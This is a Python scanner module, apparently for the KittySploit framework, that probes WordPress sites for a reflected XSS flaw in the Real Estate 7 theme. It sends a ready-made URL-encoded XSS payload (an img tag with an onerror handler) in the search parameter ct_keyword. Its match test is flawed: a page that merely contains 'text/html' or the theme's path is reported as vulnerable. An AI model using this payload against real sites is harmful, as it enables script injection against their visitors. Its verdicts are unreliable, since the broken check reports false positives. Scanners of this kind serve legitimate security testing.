#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Real Estate 7 premium theme for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) attack vec."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Real Estate 7 Theme <= 3.3.4 - Cross-Site Scripting Detection',
        'description': "The Real Estate 7 premium theme for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) attack vector in versions up to, and including, v3.3.4 via the 'ct_additional_features' option due to insufficient input sanitization and output escaping. This vulnerability allows unauthenticated attackers to inject malicious JavaScript payload in the search page that execute if they can trick a user into performing an action such as clicking on a link.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'packetstorm', 'wordpress', 'wp-theme', 'wp', 'xss', 'realestate', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploitalert.com/view-details.html?id=39344',
            'https://packetstormsecurity.com/files/171186/WordPress-Real-Estate-7-Theme-3.3.4-Cross-Site-Scripting.html',
            'https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/?ct_keyword=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&ct_city=0&ct_state=0&ct_zipcode=0&search-listings=true&ct_property_type=0&ct_beds=0&ct_baths=0&ct_price_from&ct_price_to', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', '<img src=x onerror=prompt(document.domain)>', '/wp-content/themes/realestate-7/',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Real Estate 7 Theme <= 3.3.4 - Cross-Site Scripting detected",
                path='/?ct_keyword=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E&ct_city=0&ct_state=0&ct_zipcode=0&search-listings=true&ct_property_type=0&ct_beds=0&ct_baths=0&ct_price_from&ct_price_to',
            )
            return True
        return False

